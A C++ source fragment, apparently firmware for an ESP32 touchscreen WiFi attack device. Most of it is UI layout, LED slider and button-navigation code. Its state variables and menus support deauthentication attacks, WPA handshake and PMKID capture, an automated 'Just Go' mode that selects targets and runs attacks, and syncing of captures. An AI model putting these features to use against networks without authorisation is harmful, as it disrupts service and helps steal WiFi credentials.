static Button btnWifiPwClear;
static Button btnWifiPwCancel, btnWifiPwConnect;

// Webserver screen buttons  
static Button btnWebserverBack, btnWebserverStartAP, btnWebserverStartServer;
static Button btnWebserverStopServer;
static Button btnWebserverWpaSecSync, btnWebserverDownloadResults;
static Button btnCfgWifiConnect, btnCfgWebserver, btnCfgLed;
static Button btnCfgStartup, btnCfgTelemetry;

static int wifiListTopY = 92;
static int wifiListBottomY = 200;
static int wifiRowH = 34;
static Button btnWifiRows[4];

static Button btnHopMinus, btnHopPlus;
static Button btnScanMinus, btnScanPlus;
static Button btnDeauthToggle;
static Button btnWifiDefaultLockToggle;
static Button btnCfgWifi;
static Button btnStartupAutoReconnect, btnStartupDefaultLockToggle;
static Button btnTelemetryMinus, btnTelemetryPlus, btnTelemetryVerboseToggle;
static Button btnMonitorTab1, btnMonitorTab2;
static Button btnReconBack, btnReconStart, btnReconClear;
static Button btnScopeBack, btnScopeRefresh;

static ScreenId monitorReturnScreen = ScreenId::TARGET_DETAILS;
static constexpr int MONITOR_FILE_MAX = 24;
struct MonitorFileEntry {
  char name[40];
  uint32_t size;
  bool isDir;
};
static MonitorFileEntry monitorFiles[MONITOR_FILE_MAX];
static int monitorFileCount = 0;
static int monitorFileScroll = 0;
static char monitorFilePath[96] = "/";
static char monitorFileInfo[80] = "";
static uint32_t monitorFileLastRefreshMs = 0;
static int monitorFileListX = 0;
static int monitorFileListY = 0;
static int monitorFileListW = 0;
static int monitorFileListH = 0;
static int monitorFileRowH = 14;
static int monitorFileVisibleRows = 0;

// LED Control state (buttons are local to reduce DRAM)
static uint8_t ledBrightness = 128;
static uint8_t ledRed = 255, ledGreen = 0, ledBlue = 0;
static uint16_t ledHue = 0;
static bool ledHueInitialized = false;
static bool ledSliderDraggingHue = false;
static bool ledSliderDraggingBrightness = false;

// LED slider layout (sized for 320x240 landscape CYD)
static constexpr int LED_SLIDER_X = 12;
static constexpr int LED_SLIDER_W = 188;
static constexpr int LED_SLIDER_H = 16;
static constexpr int LED_HUE_Y = 126;
static constexpr int LED_BRIGHTNESS_Y = 174;
static constexpr int LED_PREVIEW_X = 212;
static constexpr int LED_PREVIEW_Y = 120;
static constexpr int LED_PREVIEW_W = 96;
static constexpr int LED_PREVIEW_H = 96;

static uint16_t rgbToHue(uint8_t r, uint8_t g, uint8_t b) {
  float rf = (float)r / 255.0f;
  float gf = (float)g / 255.0f;
  float bf = (float)b / 255.0f;
  float maxv = fmaxf(rf, fmaxf(gf, bf));
  float minv = fminf(rf, fminf(gf, bf));
  float d = maxv - minv;
  if (d <= 0.00001f) return 0;

  float h = 0.0f;
  if (maxv == rf) {
    h = 60.0f * fmodf(((gf - bf) / d), 6.0f);
  } else if (maxv == gf) {
    h = 60.0f * (((bf - rf) / d) + 2.0f);
  } else {
    h = 60.0f * (((rf - gf) / d) + 4.0f);
  }
  if (h < 0.0f) h += 360.0f;
  uint16_t out = (uint16_t)(h + 0.5f);
  if (out >= 360) out = 0;
  return out;
}

static void hueToRgb(uint16_t hue, uint8_t& r, uint8_t& g, uint8_t& b) {
  float h = (float)(hue % 360) / 60.0f;
  float c = 1.0f;
  float x = c * (1.0f - fabsf(fmodf(h, 2.0f) - 1.0f));
  float rf = 0.0f, gf = 0.0f, bf = 0.0f;

  if (h < 1.0f)      { rf = c; gf = x; bf = 0.0f; }
  else if (h < 2.0f) { rf = x; gf = c; bf = 0.0f; }
  else if (h < 3.0f) { rf = 0.0f; gf = c; bf = x; }
  else if (h < 4.0f) { rf = 0.0f; gf = x; bf = c; }
  else if (h < 5.0f) { rf = x; gf = 0.0f; bf = c; }
  else               { rf = c; gf = 0.0f; bf = x; }

  r = (uint8_t)(rf * 255.0f + 0.5f);
  g = (uint8_t)(gf * 255.0f + 0.5f);
  b = (uint8_t)(bf * 255.0f + 0.5f);
}

static int ledSliderKnobX(int value, int minValue, int maxValue) {
  value = clampi(value, minValue, maxValue);
  long num = (long)(value - minValue) * (long)(LED_SLIDER_W - 1);
  long den = (long)(maxValue - minValue);
  if (den <= 0) den = 1;
  return LED_SLIDER_X + (int)(num / den);
}

static int ledMapTouchToValue(int touchX, int minValue, int maxValue) {
  int local = clampi(touchX - LED_SLIDER_X, 0, LED_SLIDER_W - 1);
  long num = (long)local * (long)(maxValue - minValue);
  long den = (long)(LED_SLIDER_W - 1);
  if (den <= 0) den = 1;
  return minValue + (int)((num + (den / 2)) / den);
}

static bool ledPointInSlider(int px, int py, int sliderY) {
  const int hitPadY = 10;
  return (px >= LED_SLIDER_X &&
          px < (LED_SLIDER_X + LED_SLIDER_W) &&
          py >= (sliderY - hitPadY) &&
          py <= (sliderY + LED_SLIDER_H + hitPadY));
}

static void ledEnsureHueInitialized() {
  if (ledHueInitialized) return;
  ledHue = rgbToHue(ledRed, ledGreen, ledBlue);
  ledHueInitialized = true;
}

static void ledUpdateRgbFromHue() {
  hueToRgb(ledHue, ledRed, ledGreen, ledBlue);
}

static bool ledSetHueFromTouchX(int touchX) {
  uint16_t nextHue = (uint16_t)ledMapTouchToValue(touchX, 0, 359);
  if (nextHue == ledHue) return false;
  ledHue = nextHue;
  ledUpdateRgbFromHue();
  return true;
}

static bool ledSetBrightnessFromTouchX(int touchX) {
  uint8_t nextBrightness = (uint8_t)ledMapTouchToValue(touchX, 0, 255);
  if (nextBrightness == ledBrightness) return false;
  ledBrightness = nextBrightness;
  return true;
}

static void drawHueSliderTrack() {
  for (int i = 0; i < LED_SLIDER_W; i++) {
    uint16_t h = (uint16_t)((i * 359L) / (LED_SLIDER_W - 1));
    uint8_t r, g, b;
    hueToRgb(h, r, g, b);
    tft.drawFastVLine(LED_SLIDER_X + i, LED_HUE_Y, LED_SLIDER_H, tft.color565(r, g, b));
  }
  tft.drawRect(LED_SLIDER_X - 1, LED_HUE_Y - 1, LED_SLIDER_W + 2, LED_SLIDER_H + 2, TFT_WHITE);
}

static void drawBrightnessSliderTrack() {
  uint8_t baseR, baseG, baseB;
  hueToRgb(ledHue, baseR, baseG, baseB);
  for (int i = 0; i < LED_SLIDER_W; i++) {
    uint8_t v = (uint8_t)((i * 255L) / (LED_SLIDER_W - 1));
    uint8_t r = (uint8_t)(((uint16_t)baseR * (uint16_t)v) / 255);
    uint8_t g = (uint8_t)(((uint16_t)baseG * (uint16_t)v) / 255);
    uint8_t b = (uint8_t)(((uint16_t)baseB * (uint16_t)v) / 255);
    tft.drawFastVLine(LED_SLIDER_X + i, LED_BRIGHTNESS_Y, LED_SLIDER_H, tft.color565(r, g, b));
  }
  tft.drawRect(LED_SLIDER_X - 1, LED_BRIGHTNESS_Y - 1, LED_SLIDER_W + 2, LED_SLIDER_H + 2, TFT_WHITE);
}

static void drawSliderKnob(int sliderY, int knobX) {
  int cy = sliderY + (LED_SLIDER_H / 2);
  tft.fillCircle(knobX, cy, 7, TFT_WHITE);
  tft.drawCircle(knobX, cy, 7, TFT_BLACK);
}

static void drawLedControlDynamic() {
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);

  // Slider labels and value readouts.
  const int hueLabelY = LED_HUE_Y - 18;
  const int briLabelY = LED_BRIGHTNESS_Y - 18;
  tft.fillRect(8, hueLabelY - 6, 200, 18, TFT_BLACK);
  tft.fillRect(8, briLabelY - 6, 200, 18, TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Hue", 12, hueLabelY);
  tft.drawString("Brightness", 12, briLabelY);

  char val[32];
  tft.fillRect(134, hueLabelY, 74, 14, TFT_BLACK);
  snprintf(val, sizeof(val), "%3u deg", (unsigned)ledHue);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(val, 136, hueLabelY);

  tft.fillRect(134, briLabelY, 74, 14, TFT_BLACK);
  snprintf(val, sizeof(val), "%3u", (unsigned)ledBrightness);
  tft.drawString(val, 136, briLabelY);

  // Slider tracks + knobs.
  drawHueSliderTrack();
  drawBrightnessSliderTrack();
  drawSliderKnob(LED_HUE_Y, ledSliderKnobX((int)ledHue, 0, 359));
  drawSliderKnob(LED_BRIGHTNESS_Y, ledSliderKnobX((int)ledBrightness, 0, 255));

  // Preview.
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Preview", LED_PREVIEW_X, LED_PREVIEW_Y - 16);
  uint8_t pr = (uint8_t)(((uint16_t)ledRed * (uint16_t)ledBrightness) / 255);
  uint8_t pg = (uint8_t)(((uint16_t)ledGreen * (uint16_t)ledBrightness) / 255);
  uint8_t pb = (uint8_t)(((uint16_t)ledBlue * (uint16_t)ledBrightness) / 255);
  uint16_t previewColor = tft.color565(pr, pg, pb);
  tft.fillRect(LED_PREVIEW_X, LED_PREVIEW_Y, LED_PREVIEW_W, LED_PREVIEW_H, previewColor);
  tft.drawRect(LED_PREVIEW_X, LED_PREVIEW_Y, LED_PREVIEW_W, LED_PREVIEW_H, TFT_WHITE);

  // Numeric diagnostics.
  tft.fillRect(8, 194, 300, 34, TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  snprintf(val, sizeof(val), "H:%3u  B:%3u", (unsigned)ledHue, (unsigned)ledBrightness);
  tft.drawString(val, 12, 194);

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  snprintf(val, sizeof(val), "R:%3u G:%3u B:%3u",
           (unsigned)ledRed, (unsigned)ledGreen, (unsigned)ledBlue);
  tft.drawString(val, 12, 210);
}

// Bruce Monitor screen buttons and state
static Button btnBruceMonBack;
static Button btnBruceMonFiles;
static Button bruceMenuBtns[6];
static Button btnBruceSetTargetBack;
static Button btnBruceSetTargetAll;
static Button btnBruceSetTargetRows[8];
static Button btnBruceSetTargetUp;
static Button btnBruceSetTargetDown;
// Bruce attack target selection (compact storage)
static uint8_t bruceTargetBssid[6] = {0};
static char bruceTargetSsid[20] = {0};  // Reduced to save DRAM
static uint8_t bruceTargetChannel = 0;
static bool bruceHasSelectedTarget = false;
static uint32_t bruceMonLastUpdateMs  = 0;
static uint32_t bruceMonLastDrawMs    = 0;  // Separate timer for screen redraws
static int bruceMonLastLineCount      = -1;  // Track content changes
static bool bruceMonLastAttackingState = false;
static bool     bruceCaptureWasClosed = false;
static char     brucePcapPath[20]        = {0};
static char     bruceSessionLogPath[20]  = {0};
static File     brucePcapFile;
static File     bruceSessionLogFile;
static uint32_t brucePcapFrameCount   = 0;

// Deferred PCAP ring buffer — frames are enqueued from the TX callback
// (ISR-like context inside bruceAttackTick) and drained safely every 50ms.
// Minimal queue + fast drain (20fps screen update) = zero drops at 50fps attack rate.
#define BRUCE_PCAP_QUEUE_SIZE 1
struct BrucePcapEntry {
  uint8_t  frame[28];    // Captures deauth(26B) + 2B headroom; longer frames truncated
  uint8_t  len;
  uint8_t  channel;
  uint32_t ts_ms;
};
static BrucePcapEntry brucePcapQueue[BRUCE_PCAP_QUEUE_SIZE];
static volatile uint8_t brucePcapQueueHead = 0;  // write index
static volatile uint8_t brucePcapQueueTail = 0;  // read  index

static constexpr int MONITOR_MAX_LINES = 6;  // Reduced to save DRAM
struct MonitorLine {
  char text[48];  // Reduced to save DRAM
  uint16_t color;
};
static MonitorLine monitorLines[MONITOR_MAX_LINES];
static int monitorLineCount = 0;
static uint32_t monitorLastUpdateMs = 0;
static bool monitorLayoutDrawn = false;
static uint32_t monitorDrawnSig[MONITOR_MAX_LINES] = {0};
static uint16_t monitorDrawnColor[MONITOR_MAX_LINES] = {0};
static int monitorDrawnCount = -1;
static uint32_t monitorLastPkts = 0;
static uint32_t monitorLastBeacon = 0;
static uint32_t monitorLastHs = 0;
// Raw mode monitor tracking (for in-place updates)
static uint32_t rawMonLastPkts = 0;
static uint32_t rawMonLastMgmt = 0;
static uint32_t rawMonLastCtrl = 0;
static uint32_t rawMonLastData = 0;
static uint32_t rawMonLastBeacon = 0;
static uint32_t rawMonLastHs = 0;
static uint32_t rawMonLastDropped = 0;
static uint32_t rawMonLastErrors = 0;
static int rawMonLastPps = 0;
static uint32_t jammitLastTickMs = 0;
static uint32_t jammitLastPkts = 0;
static uint16_t jammitLastScore = 0;
static uint32_t jammitLastDeauthMs = 0;
static uint32_t jammitDeauthCount = 0;
static uint16_t jammitSeqNum = 0;  // IEEE 802.11 sequence counter (12-bit)
// Note: JAMMIT client tracking vars, session log paths, and cached BSSID
// are declared near the top of the file (before handleCapturedPacket).

// Y0INK mode globals
static uint32_t yoinkLastTickMs = 0;
static uint32_t yoinkLastPkts = 0;
static uint16_t yoinkClientCount = 0;
static uint32_t yoinkHandshakeCaptureCount = 0;
static uint32_t yoinkLastDeauthMs = 0;
static uint32_t yoinkDeauthCount = 0;
static uint32_t scopeLastScanMs = 0;
static uint32_t scopeLastDrawMs = 0;
static bool scopeLayoutDrawn = false;
static uint32_t scopeMetaDrawnSig = 0;
static uint32_t scopeApDrawnSig[5] = {0};
static constexpr int SCOPE_CH_COUNT = 13;
static constexpr int SCOPE_WATERFALL_MAX_ROWS = 72;
static uint8_t scopeWaterfall[SCOPE_CH_COUNT][SCOPE_WATERFALL_MAX_ROWS];
static uint8_t scopeWaterfallRows = 0;
static uint16_t hypercubeFrame = 0;
static uint32_t hypercubeLastTickMs = 0;

static constexpr float HYPERCUBE_TARGET_SCREEN_FRACTION = 0.10f;

// Hunter globals
static bool reconActive = false;
static bool reconLayoutDrawn = false;
static uint32_t reconLastDrawChannel = 0;
static uint32_t reconLastLogCount = 0;
static uint32_t reconLastTotalEvents = 0;
static uint32_t reconConsoleY = 0;  // Console scroll area Y position
static uint32_t reconConsoleH = 0;  // Console height


// Monitor view mode
enum class MonitorMode : uint8_t { LIVE, FILES };
static MonitorMode monitorMode = MonitorMode::LIVE;

// Just Go automation state
enum class JustGoStage : uint8_t { IDLE, SCAN, SELECT_TARGET, RUN_MODE, COOLDOWN };
static bool justGoActive = false;
static bool justGoSprayPray = false;
static bool justGoWpaOnly = true;
static bool justGoAutoHop = true;
static uint8_t justGoStayMinutes = 3;
static JustGoStage justGoStage = JustGoStage::IDLE;
static uint32_t justGoStageStartMs = 0;
static uint32_t justGoTargetStartMs = 0;
static AutoMode justGoMode = AutoMode::NONE;
static uint8_t justGoModeStep = 0;
static uint8_t justGoTargets[3];

// Just Go console update tracking (only update on state changes, not periodic)
static AutoMode justGoLastMode = AutoMode::NONE;
static JustGoStage justGoLastStage = JustGoStage::IDLE;
static uint32_t justGoLastUpdateMs = 0;
static uint8_t justGoLastConsoleLineCount = 0;  // Track console changes for display refresh
static uint8_t justGoTargetCount = 0;
static uint8_t justGoTargetPos = 0;
static char justGoStatusLine[24] = "";
static uint8_t justGoLogCount = 0;

// JustGo console update tracking - trigger immediate updates on metric changes
static AutoMode justGoLastModeReported = AutoMode::NONE;
static uint8_t justGoLastClientCount = 0;
static uint8_t justGoLastHandshakeCount = 0;
static uint8_t justGoLastPmkidCount = 0;
static uint32_t justGoLastDeauthCount = 0;
static uint32_t justGoLastConsoleUpdateMs = 0;

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static constexpr uint8_t TDISPLAY_NAV_MAX_ITEMS = 64;
static Button tdisplayNavItems[TDISPLAY_NAV_MAX_ITEMS];
static uint8_t tdisplayNavCount = 0;
static uint8_t tdisplayNavIndex = 0;
static ScreenId tdisplayNavScreen = ScreenId::HOME;
static bool tdisplayNavRefreshRequested = false;

static bool tdisplayNavButtonValid(const Button& b) {
  return (b.w > 2 && b.h > 2);
}

static void tdisplayNavPush(const Button& b) {
  if (!tdisplayNavButtonValid(b)) return;
  if (tdisplayNavCount >= TDISPLAY_NAV_MAX_ITEMS) return;
  tdisplayNavItems[tdisplayNavCount++] = b;
}

static String tdisplayNavCurrentLabel() {
  if (tdisplayNavCount == 0) return "none";
  const char* raw = tdisplayNavItems[tdisplayNavIndex].label;
  if (!raw || raw[0] == '\0') return "item";
  return String(raw);
}

static void tdisplayNavDrawHeaderStatus() {
  if (!currentHeaderTitle || currentHeaderTitle[0] == '\0') return;
  layoutHypercubeBox();

  const bool compact = (tft.height() <= 180);
  const int titleSize = compact ? 1 : 2;
  const int titleX = 8;
  const int titleY = 8;

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(titleSize);
  String headerTitle = String(currentHeaderTitle);
  const int maxTitleW = (hypercubeBoxX - 12) - 8;
  if (maxTitleW > 8) {
    while (headerTitle.length() > 3 && tft.textWidth(headerTitle) > maxTitleW) {
      headerTitle.remove(headerTitle.length() - 1);
    }
    if (headerTitle != String(currentHeaderTitle) && headerTitle.length() > 3) {
      headerTitle.remove(headerTitle.length() - 3);
      headerTitle += "...";
    }
  }

  const int titleW = tft.textWidth(headerTitle);
  const int statusX = titleX + titleW + 6;
  const int statusRight = hypercubeBoxX - 12;
  const int statusW = statusRight - statusX;
  if (statusW < 38) return;

  tft.fillRect(statusX, titleY - 1, statusW, compact ? 10 : 14, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);

  String msg = "SEL: " + tdisplayNavCurrentLabel();
  while (msg.length() > 3 && tft.textWidth(msg) > (statusW - 2)) {
    msg.remove(msg.length() - 1);
  }
  if (msg.length() > 3 && tft.textWidth(msg) > (statusW - 2)) return;

  tft.drawString(msg, statusX + 1, titleY + (compact ? 1 : 2));
}

static void tdisplayNavDrawSelectedOutline() {
  if (tdisplayNavCount == 0) return;

  const Button& b = tdisplayNavItems[tdisplayNavIndex];
  const int yOff = buttonRenderYOffset(b);
  const int bx0 = b.x;
  const int by0 = b.y + yOff;
  const int bx1 = b.x + b.w - 1;
  const int by1 = by0 + b.h - 1;

  const int x0 = clampi(bx0 - 2, 1, tft.width() - 2);
  const int y0 = clampi(by0 - 2, 1, tft.height() - 2);
  const int x1 = clampi(bx1 + 2, 1, tft.width() - 2);
  const int y1 = clampi(by1 + 2, 1, tft.height() - 2);

  const int w = x1 - x0 + 1;
  const int h = y1 - y0 + 1;
  if (w <= 2 || h <= 2) return;

  tft.drawRect(x0, y0, w, h, TFT_YELLOW);
  if (w > 4 && h > 4) {
    tft.drawRect(x0 + 1, y0 + 1, w - 2, h - 2, TFT_CYAN);
  }
}

static void tdisplayNavDrawHint() {
  tdisplayNavBuild();
  tdisplayNavDrawHeaderStatus();
  tdisplayNavDrawSelectedOutline();
}

static void tdisplayNavBuild() {
  if (screen != tdisplayNavScreen) {
    tdisplayNavScreen = screen;
    tdisplayNavIndex = 0;
  }

  tdisplayNavCount = 0;

  switch (screen) {
    case ScreenId::HOME:
      if (homeReconnectPromptActive || homeTargetsPromptActive) {
        tdisplayNavPush(btnHomePromptNo);
        tdisplayNavPush(btnHomePromptYes);
      } else {
        for (int i = 0; i < HOME_BTN_COUNT; i++) tdisplayNavPush(homeBtns[i]);
      }
      break;
    case ScreenId::JUST_GO:
      tdisplayNavPush(btnJustGoBack);
      tdisplayNavPush(btnJustGoToggle);
      tdisplayNavPush(btnJustGoSpray);
      tdisplayNavPush(btnJustGoStayMinus);
      tdisplayNavPush(btnJustGoStayPlus);
      tdisplayNavPush(btnJustGoProfilePrev);
      tdisplayNavPush(btnJustGoProfileNext);
      break;
    case ScreenId::WIFI_SCAN:
      tdisplayNavPush(btnWifiBack);
      tdisplayNavPush(btnWifiScan);
      tdisplayNavPush(btnWifiStop);
      tdisplayNavPush(btnWifiUp);
      tdisplayNavPush(btnWifiDown);
      for (int i = 0; i < 4; i++) {
        if ((apScroll + i) < apCount) tdisplayNavPush(btnWifiRows[i]);
      }
      break;
    case ScreenId::CONFIRM_TARGET:
      tdisplayNavPush(btnWifiNo);
      tdisplayNavPush(btnWifiYes);
      break;
    case ScreenId::TARGET_DETAILS:
      tdisplayNavPush(btnTargetBack);
      tdisplayNavPush(btnTargetAutomate);
      tdisplayNavPush(btnTargetMonitor);
      tdisplayNavPush(btnTargetLock);
      tdisplayNavPush(btnTargetSniff);
      break;
    case ScreenId::AUTOMATE_MENU:
      tdisplayNavPush(btnAutoBack);
      tdisplayNavPush(btnAutoY0INK);
      tdisplayNavPush(btnAutoRAW);
      tdisplayNavPush(btnAutoSCOPE);
      tdisplayNavPush(btnAutoJAMMIT);
      break;
    case ScreenId::CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnCfgWifi);
      tdisplayNavPush(btnCfgWifiConnect);
      tdisplayNavPush(btnCfgWebserver);
      tdisplayNavPush(btnCfgStartup);
      tdisplayNavPush(btnCfgTelemetry);
      tdisplayNavPush(btnCfgLed);
      break;
    case ScreenId::WIFI_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnSave);
      tdisplayNavPush(btnHopMinus);
      tdisplayNavPush(btnHopPlus);
      tdisplayNavPush(btnScanMinus);
      tdisplayNavPush(btnScanPlus);
      tdisplayNavPush(btnDeauthToggle);
      tdisplayNavPush(btnWifiDefaultLockToggle);
      break;
    case ScreenId::STARTUP_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnStartupAutoReconnect);
      tdisplayNavPush(btnStartupDefaultLockToggle);
      break;
    case ScreenId::TELEMETRY_CONFIG:
      tdisplayNavPush(btnBack);
      tdisplayNavPush(btnTelemetryMinus);
      tdisplayNavPush(btnTelemetryPlus);
      tdisplayNavPush(btnTelemetryVerboseToggle);
      break;
    case ScreenId::WIFI_CONNECT:
      if (wifiConnectShowPasswordModal) {
        for (int i = 0; i < wifiPwKeyCount; i++) tdisplayNavPush(btnWifiPwKeys[i]);
        tdisplayNavPush(btnWifiPwShift);
        tdisplayNavPush(btnWifiPwBack);
        tdisplayNavPush(btnWifiPwSpace);
        tdisplayNavPush(btnWifiPwClear);
        tdisplayNavPush(btnWifiPwCancel);
        tdisplayNavPush(btnWifiPwConnect);
      } else {
        tdisplayNavPush(btnWifiConnectBack);
        tdisplayNavPush(btnWifiConnectScan);
        tdisplayNavPush(btnWifiConnectSubmit);
        tdisplayNavPush(btnWifiConnectDisconnect);
        tdisplayNavPush(btnWifiConnectUp);
        tdisplayNavPush(btnWifiConnectDown);
        for (int i = 0; i < 3; i++) tdisplayNavPush(btnWifiConnectList[i]);
      }
      break;
    case ScreenId::WEBSERVER:
      tdisplayNavPush(btnWebserverBack);
      tdisplayNavPush(btnWebserverStartAP);
      tdisplayNavPush(btnWebserverStartServer);
      tdisplayNavPush(btnWebserverWpaSecSync);
      tdisplayNavPush(btnWebserverDownloadResults);
      break;
    case ScreenId::MONITOR:
      tdisplayNavPush(btnMonitorBack);
      tdisplayNavPush(btnMonitorTab1);
      tdisplayNavPush(btnMonitorTab2);
      tdisplayNavPush(btnMonitorUpDir);
      tdisplayNavPush(btnMonitorUp);
      tdisplayNavPush(btnMonitorDown);
      break;
    case ScreenId::RECON:
      tdisplayNavPush(btnReconBack);
      tdisplayNavPush(btnReconStart);
      tdisplayNavPush(btnReconClear);
      break;
    case ScreenId::SCOPE_GRAPH:
      tdisplayNavPush(btnScopeBack);
      tdisplayNavPush(btnScopeRefresh);
      break;
    case ScreenId::ABOUT:
    case ScreenId::TARGETS_PLACEHOLDER:
    case ScreenId::LED_CONTROL:
      tdisplayNavPush(btnBack);
      break;
    case ScreenId::BRUCE_MENU:
      for (int i = 0; i < 6; i++) tdisplayNavPush(bruceMenuBtns[i]);
      break;
    case ScreenId::BRUCE_MONITOR:
      tdisplayNavPush(btnBruceMonBack);
      tdisplayNavPush(btnBruceMonFiles);
      break;
    case ScreenId::BRUCE_SET_TARGET:
      tdisplayNavPush(btnBruceSetTargetAll);
      for (int i = 0; i < 8; i++) tdisplayNavPush(btnBruceSetTargetRows[i]);
      tdisplayNavPush(btnBruceSetTargetUp);
      tdisplayNavPush(btnBruceSetTargetDown);
      tdisplayNavPush(btnBruceSetTargetBack);
      break;
  }

  if (tdisplayNavCount == 0) tdisplayNavPush(btnBack);
  if (tdisplayNavCount > 0 && tdisplayNavIndex >= tdisplayNavCount) tdisplayNavIndex = 0;
}

static bool tdisplayNavConsumeRefreshRequest() {
  const bool pending = tdisplayNavRefreshRequested;
  tdisplayNavRefreshRequested = false;
  return pending;
}

static bool tdisplayHandleButtonInput(int& outX, int& outY) {
  static bool wasNextDown = false;
  static bool wasSelectDown = false;
  static int lastEncA = HIGH;

  const bool nextDown = (PIN_NAV_NEXT >= 0) && (digitalRead(PIN_NAV_NEXT) == LOW);
  const bool selectDown = (PIN_NAV_SELECT >= 0) && (digitalRead(PIN_NAV_SELECT) == LOW);

  tdisplayNavBuild();

  bool rotateNext = false;
  bool rotatePrev = false;
#if defined(NEONDRIVE_TARGET_TEMBED)
  if (PIN_ENCODER_A >= 0 && PIN_ENCODER_B >= 0) {
    const int a = digitalRead(PIN_ENCODER_A);
    const int b = digitalRead(PIN_ENCODER_B);
    if (a != lastEncA) {
      // Quadrature decode on A edge: CW => next, CCW => previous.
      if (b != a) {
        rotateNext = true;
      } else {
        rotatePrev = true;
      }
      lastEncA = a;
    }
  }
#endif

  if (rotatePrev) {
    if (tdisplayNavCount > 0) {
      tdisplayNavIndex = (tdisplayNavIndex == 0) ? (tdisplayNavCount - 1) : (tdisplayNavIndex - 1);
      tdisplayNavRefreshRequested = true;
    }
    return false;
  }

  if (rotateNext || (nextDown && !wasNextDown)) {
    wasNextDown = true;
    if (tdisplayNavCount > 0) {
      tdisplayNavIndex = (uint8_t)((tdisplayNavIndex + 1) % tdisplayNavCount);
      tdisplayNavRefreshRequested = true;
    }
    return false;
  }

  if (selectDown && !wasSelectDown) {
    wasSelectDown = true;
    if (tdisplayNavCount > 0) {
      const Button& b = tdisplayNavItems[tdisplayNavIndex];
      const int yOff = buttonRenderYOffset(b);
      outX = b.x + (b.w / 2);
      outY = b.y + yOff + (b.h / 2);
      g_lastTouchRawX = outX;
      g_lastTouchRawY = outY;
      g_lastTouchRawZ = 1;
      tdisplayNavDrawHint();
      return true;
    }
    return false;
  }

  if (!nextDown) wasNextDown = false;
  if (!selectDown) wasSelectDown = false;
  return false;
}
#endif

static void layoutHome() {
  const int w = tft.width();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const int pad = 8;
  const int gapH = compact ? 6 : 8;
  const int gapV = compact ? 4 : 8;
  const int gridBtnH = compact ? 30 : 46;
  const int gridBtnW = (w - (pad * 2) - ((HOME_BTN_COLS - 1) * gapH)) / HOME_BTN_COLS;

  // Top row buttons match the same size as all other Home buttons.
  const int topBtnY = compact ? (hypercubeReservedBottomY + 2) : 28;
  homeBtns[0] = {pad, topBtnY, gridBtnW, gridBtnH, "Just Go"};
  homeBtns[1] = {pad + gridBtnW + gapH, topBtnY, gridBtnW, gridBtnH, "WiFi"};

  // Main grid (2 rows x 3 cols): Logs / Targets / Recon / Config / About / BRUCE.
  // Anchor the bottom row ~10px above the footer text baseline.
  const int footerTextY = h - 6;
  const int bottomRowY = (footerTextY - 10) - gridBtnH;
  const int gridTop = bottomRowY - (gridBtnH + gapV);
  const char* gridLabels[6] = {"Logs", "Target", "Recon", "Config", "About", "BRUCE"};
  int idx = 2;
  for (int r = 0; r < 2; ++r) {
    const int y = gridTop + r * (gridBtnH + gapV);
    for (int c = 0; c < HOME_BTN_COLS; ++c) {
      const int x = pad + c * (gridBtnW + gapH);
      homeBtns[idx++] = {x, y, gridBtnW, gridBtnH, gridLabels[(r * HOME_BTN_COLS) + c]};
    }
  }
}

static void drawHomeTargetsPromptOverlay();
static void drawHomeReconnectPromptOverlay();

struct HypercubePalette {
  uint16_t edgeA;
  uint16_t edgeB;
  uint16_t node;
};

static void layoutHypercubeBox() {
  const int w = tft.width();
  const int h = tft.height();
  int headerTop = 2;
  int headerH = HYPERCUBE_TARGET_SIZE_PX + 4;
  int marginRight = 4;
  if (screen == ScreenId::WIFI_CONNECT) {
    // WiFi Connect gets a tighter top-right placement to keep content clear.
    headerTop = 0;
    headerH = HYPERCUBE_TARGET_SIZE_PX + 2;
    marginRight = 1;
  }
  const int minSize = (h <= 180) ? 36 : 48;
  int size = HYPERCUBE_TARGET_SIZE_PX;
  if (size > w - 10) size = w - 10;
  if (size > headerH) size = headerH;
  if (size < minSize) size = minSize;

  hypercubeBoxW = size;
  hypercubeBoxH = size;
  hypercubeBoxX = w - marginRight - size;
  hypercubeBoxY = headerTop + ((headerH - size) / 2);
  hypercubeReservedBottomY = hypercubeBoxY + hypercubeBoxH + 6;
}

static void drawCyberBackdropRegion(int x, int y, int w, int h) {
  if (w <= 0 || h <= 0) return;
  const int x2 = x + w;
  const int y2 = y + h;
  tft.fillRect(x, y, w, h, TFT_BLACK);

  int startY = 0;
  while (startY < y) startY += 16;
  for (int yy = startY; yy < y2; yy += 16) tft.drawFastHLine(x, yy, w, 0x1082);

  int startX = 0;
  while (startX < x) startX += 20;
  for (int xx = startX; xx < x2; xx += 20) tft.drawFastVLine(xx, y, y2 - y, 0x0841);
}

static HypercubePalette getHypercubePalette() {
  const uint32_t now = millis();
  const bool flash = (int32_t)(hypercubeFlashUntilMs - now) > 0;
  if (flash) {
    const bool phase = ((now / 180U) & 0x01U) == 0;
    if (phase) return {0xFD20, 0x780F, 0xFFFF};  // orange + purple
    return {0x780F, 0xFD20, 0xFFFF};
  }
  
  // CYBER PUNKY: Just Go color reactions
  if (justGoActive) {
    const uint32_t stageDuration = now - justGoStageStartMs;
    const bool pulse = ((stageDuration / 150U) & 0x01U) == 0;
    
    switch (justGoStage) {
      case JustGoStage::SCAN: {
        // Scanning: Bright neon green + cyan pulse (searching the airwaves)
        const bool scanPulse = ((now / 120U) & 0x01U) == 0;
        if (scanPulse) return {0x07E0, 0x07FF, 0x9FF0};  // Lime green + cyan + bright cyan
        return {0x07FF, 0x07E0, 0x87FF};  // Cyan + lime green + lighter cyan
      }
      case JustGoStage::SELECT_TARGET: {
        // Targeting: Electric blue + purple (locking on)
        if (pulse) return {0x0C1F, 0x8018, 0xF81F};  // Deep blue + purple + hot magenta
